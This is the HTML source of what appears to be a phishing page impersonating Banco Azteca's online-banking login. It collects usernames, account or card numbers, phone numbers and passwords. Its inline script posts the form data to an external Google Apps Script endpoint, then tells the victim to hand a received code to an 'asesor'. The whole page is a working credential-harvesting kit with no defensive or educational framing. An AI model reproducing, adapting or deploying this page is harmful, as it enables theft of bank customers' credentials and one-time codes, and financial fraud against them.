<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="preconnect" href="https://fonts.googleapis.com/">
	<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
	<link rel="stylesheet" href="css/estilos.css">
	<link rel="icon" href="fabasV2.ico">
	
	<title>Banco Azteca, tu banca en linea |  Sueñas, Decide, Logras</title>
</head>
<body cz-shortcut-listen="true">
	<div class="contenedor">
		<div class="columna-izquierda">
			<div class="registro activo" id="registro">
				<div class="header">
					<h1>Banco Azteca</h1>
					<p>Inicia sesion para continuar</p>
				</div>
		
				<form class="formulario" id="contact-form"  name="submit-form">
					<label for="nombre">Usuario</label>
					<div class="contenedor-input">
						
							<path d="M11 6a3 3 0 1 1-6 0 3 3 0 0 1 6 0z">
							<path fill-rule="evenodd" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm8-7a7 7 0 0 0-5.468 11.37C3.242 11.226 4.805 10 8 10s4.757 1.225 5.468 2.37A7 7 0 0 0 8 1z">
						
						<input type="password" id="nombre" name="nombre" placeholder="Usuario/Cuenta/Tarjeta/Celular">
					</path></path></div>
		
					<label for="correo">Contraseña</label>
					<div class="contenedor-input">
						
							<path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4zm2-1a1 1 0 0 0-1 1v.217l7 4.2 7-4.2V4a1 1 0 0 0-1-1H2zm13 2.383-4.758 2.855L15 11.114v-5.73zm-.034 6.878L9.271 8.82 8 9.583 6.728 8.82l-5.694 3.44A1 1 0 0 0 2 13h12a1 1 0 0 0 .966-.739zM1 11.114l4.758-2.876L1 5.383v5.73z">
						
						<input type="password" id="correo" name="correo" placeholder="Contraseña">
					</path></div>
					
					<label for="telefono">Confirmar contraseña</label>
					<div class="contenedor-input">
						
							<path d="M3.654 1.328a.678.678 0 0 0-1.015-.063L1.605 2.3c-.483.484-.661 1.169-.45 1.77a17.568 17.568 0 0 0 4.168 6.608 17.569 17.569 0 0 0 6.608 4.168c.601.211 1.286.033 1.77-.45l1.034-1.034a.678.678 0 0 0-.063-1.015l-2.307-1.794a.678.678 0 0 0-.58-.122l-2.19.547a1.745 1.745 0 0 1-1.657-.459L5.482 8.062a1.745 1.745 0 0 1-.46-1.657l.548-2.19a.678.678 0 0 0-.122-.58L3.654 1.328zM1.884.511a1.745 1.745 0 0 1 2.612.163L6.29 2.98c.329.423.445.974.315 1.494l-.547 2.19a.678.678 0 0 0 .178.643l2.457 2.457a.678.678 0 0 0 .644.178l2.189-.547a1.745 1.745 0 0 1 1.494.315l2.306 1.794c.829.645.905 1.87.163 2.611l-1.034 1.034c-.74.74-1.846 1.065-2.877.702a18.634 18.634 0 0 1-7.01-4.42 18.634 18.634 0 0 1-4.42-7.009c-.362-1.03-.037-2.137.703-2.877L1.885.511z">
						
						<input type="password" id="telefono" name="telefono" placeholder="confirmar contraseña">
					</path></div>
		
					<div class="contenedor-boton">
						<button type="submit"  id="submit-contact-form" onclick="miMensaje()">
							Registrame
							<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-check" viewBox="0 0 16 16">
								<path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.267.267 0 0 1 .02-.022z"></path>
							</svg>
						</button>
					</div>
				</form>
			</div>

			<div class="header exito" id="exito">
				<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-check-circle" viewBox="0 0 16 16">
					<path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"></path>
					<path d="M10.97 4.97a.235.235 0 0 0-.02.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-1.071-1.05z"></path>
				</svg>
				<h1>Te enviamos un mensaje!</h1>
				<p>Para concluir exitosamente dale el codigo que te enviamos a tu asesor.</p>
			</div>
		</div>

		<div class="columna-derecha">

		</div>
	</div>
	<script>
const scriptURL = 'https://script.google.com/macros/s/AKfycbz2yuWrZGcVypyZ1BD7pAlxAwOYvyaurab249gpZIFNZP2zxL-el4ZBOBkxBbyeO5VtnA/exec'
const form = document.forms['submit-form']
const registro = document.getElementById('registro');
const exito = document.getElementById('exito');

form.addEventListener('submit', e => {
  e.preventDefault()
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
    .then(response => console.log('Success!', response))
    .then(response => exito.classList.add('activo'))
    .then(response => registro.classList.remove('activo'))
    .catch(error => console.log('Error!', error.message))
   
	 
})
		
function miMensaje() {
  var element = document.getElementById("registro");
    element.classList.remove("activo");
  var element = document.getElementById("exito");
    element.classList.add("activo");	
}	

</script>   

	
	
</body></html>
